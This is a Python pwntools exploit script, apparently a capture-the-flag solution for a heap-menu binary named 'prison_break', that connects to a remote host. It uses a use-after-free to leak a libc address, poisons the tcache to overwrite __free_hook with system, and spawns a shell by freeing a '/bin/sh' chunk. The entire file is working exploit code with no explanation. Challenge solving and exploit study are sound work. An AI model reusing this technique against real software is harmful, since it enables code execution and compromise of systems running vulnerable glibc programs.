from pwn import *

context.binary = binary = ELF('./prison_break',checksec=False)
libc = ELF('./glibc/libc.so.6',checksec=False)

def create(idx, size, data):
	p.sendlineafter(b'# ', b'1')
	p.sendlineafter(b'Journal index:\n', str(idx).encode())
	p.sendlineafter(b'Journal size:\n', str(size).encode())
	p.sendlineafter(b'Enter your data:\n', data)

def delete(idx):
	p.sendlineafter(b'# ', b'2')
	p.sendlineafter(b'Journal index:\n', str(idx).encode())

def copy_paste(copy_idx, paste_idx):
	p.sendlineafter(b'# ', b'4')
	p.sendlineafter(b'Copy index:\n', str(copy_idx).encode())
	p.sendlineafter(b'Paste index:\n', str(paste_idx).encode())

def view(idx):
	p.sendlineafter(b'# ', b'3')
	p.sendlineafter(b'Journal index:\n', str(idx).encode())
	p.recvuntil(b'entry:\n')
	return p.recvline()[:-1]

#p = process()
p = remote('94.237.54.190',56701)

create(0, 0x500, b'AAAA')
create(1, 0x500, b'BBBB')
delete(0)
copy_paste(0,1)

libc_leak = u64(view(1).ljust(8, b'\x00'))
libc.address = libc_leak - 0x3ebca0
info(f'LIBC Leak: {hex(libc_leak)}')
info(f'LIBC Base: {hex(libc.address)}')

create(2, 0x80, b'CCCC')
create(3, 0x80, b'DDDD')
create(4, 0x80, p64(libc.symbols.__free_hook))
create(5, 0x80, b'/bin/sh\x00')

delete(2)
delete(3)

copy_paste(4, 3)

create(6, 0x80, b'EEEE')
create(7, 0x80, p64(libc.symbols.system))

delete(5)

p.interactive()
